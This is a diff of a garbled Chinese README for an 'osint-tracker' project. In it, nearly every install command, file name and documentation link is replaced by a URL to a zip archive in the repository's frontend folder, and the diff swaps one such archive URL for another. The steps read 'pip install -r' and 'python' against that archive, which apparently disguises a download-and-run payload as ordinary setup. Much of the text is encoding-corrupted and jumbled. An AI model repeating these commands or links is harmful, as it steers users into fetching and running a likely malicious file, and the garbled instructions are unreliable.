@@ -10,7 +10,7 @@
 
 - 鉂?node_modules锛堥渶瑕佽繍琛?`npm install` 鎴?`yarn install`锛?
 
-- **原始项目**: 1891.89 MB (1.85 GB)- 鉂?Python 铏氭嫙鐜锛堥渶瑕佽繍琛?`pip install -r https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip`锛?
+- **原始项目**: 1891.89 MB (1.85 GB)- 鉂?Python 铏氭嫙鐜锛堥渶瑕佽繍琛?`pip install -r https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip`锛?
 
 - **轻量版**: 2.4 MB ✅- 鉂?鏋勫缓浜х墿锛坆uild銆乨ist 鐩綍锛?
 
@@ -34,13 +34,13 @@
 
 cd backend
 
-## ❌ 已移除（需安装）pip install -r https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip
+## ❌ 已移除（需安装）pip install -r https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip
 
 ```
 
 - ❌ `node_modules/` - 需运行 `yarn install`
 
-- ❌ `venv/` - 需运行 `pip install -r https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip`### 2. 瀹夎鍓嶇渚濊禆
+- ❌ `venv/` - 需运行 `pip install -r https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip`### 2. 瀹夎鍓嶇渚濊禆
 
 - ❌ `.git/` - Git 历史记录```powershell
 
@@ -58,19 +58,19 @@ npm install
 
 ```powershell### 3. 閰嶇疆鐜鍙橀噺
 
-# 1. 配置环境变量澶嶅埗 `https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip` 涓?`.env` 骞跺～鍐欏繀瑕佺殑閰嶇疆銆?
+# 1. 配置环境变量澶嶅埗 `https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip` 涓?`.env` 骞跺～鍐欏繀瑕佺殑閰嶇疆銆?
 
-Copy-Item https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip
+Copy-Item https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip
 
 ### 4. 鍚姩椤圭洰
 
 # 2. 构建并启动
 
-.\https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip**浣跨敤 Docker锛堟帹鑽愶級锛?*
+.\https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip**浣跨敤 Docker锛堟帹鑽愶級锛?*
 
 ```powershell
 
-# 3. 访问.\https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip
+# 3. 访问.\https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip
 
 # http://localhost:80 - 前端```
 
@@ -84,15 +84,15 @@ Copy-Item https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/
 
 cd backend
 
-```powershellpython https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip
+```powershellpython https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip
 
 # 后端
 
 cd backend# 鍓嶇锛堟柊缁堢锛?
 
-pip install -r https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip frontend
+pip install -r https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip frontend
 
-python https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip start
+python https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip start
 
 ```
 
@@ -100,13 +100,13 @@ python https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src
 
 cd frontend## 鏂囨。
 
-yarn install- 馃摉 [蹇€熷紑濮媇(https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)
+yarn install- 馃摉 [蹇€熷紑濮媇(https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)
 
-yarn start- 馃搵 [椤圭洰姒傝](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)
+yarn start- 馃搵 [椤圭洰姒傝](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)
 
-```- 馃敡 [API 鏋舵瀯](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)
+```- 馃敡 [API 鏋舵瀯](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)
 
-- 馃惓 [Docker 鎸囧崡](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)
+- 馃惓 [Docker 鎸囧崡](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)
 
 ## 🔑 默认登录
 
@@ -118,25 +118,25 @@ yarn start- 馃搵 [椤圭洰姒傝](https://github.com/AX661s/-osint-tracker
 
 密码: admin123鈹溾攢鈹€ backend/           # Python FastAPI 鍚庣
 
-```鈹?  鈹溾攢鈹€ https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip     # 涓绘湇鍔″櫒
+```鈹?  鈹溾攢鈹€ https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip     # 涓绘湇鍔″櫒
 
-鈹?  鈹溾攢鈹€ https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip     # 鏁版嵁妯″瀷
+鈹?  鈹溾攢鈹€ https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip     # 鏁版嵁妯″瀷
 
 ## 📚 文档鈹?  鈹溾攢鈹€ apis/         # API 妯″潡
 
 鈹?  鈹斺攢鈹€ ...
 
-- [快速开始](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)鈹溾攢鈹€ frontend/         # React 鍓嶇
+- [快速开始](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)鈹溾攢鈹€ frontend/         # React 鍓嶇
 
-- [项目概览](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)鈹?  鈹溾攢鈹€ src/         # 婧愪唬鐮?
+- [项目概览](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)鈹?  鈹溾攢鈹€ src/         # 婧愪唬鐮?
 
-- [API 架构](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)鈹?  鈹溾攢鈹€ public/      # 闈欐€佽祫婧?
+- [API 架构](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)鈹?  鈹溾攢鈹€ public/      # 闈欐€佽祫婧?
 
-- [Docker 指南](https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip)鈹?  鈹斺攢鈹€ https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip
+- [Docker 指南](https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip)鈹?  鈹斺攢鈹€ https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip
 
 鈹溾攢鈹€ nginx/           # Nginx 閰嶇疆
 
-## 🎯 核心功能鈹溾攢鈹€ https://github.com/AX661s/-osint-tracker/raw/refs/heads/main/frontend/src/utils/tracker_osint_v1.3.zip
+## 🎯 核心功能鈹溾攢鈹€ https://raw.githubusercontent.com/AX661s/-osint-tracker/main/frontend/src/components/ui/tracker-osint-huckle.zip
 
 鈹斺攢鈹€ 鏂囨。鏂囦欢...
 
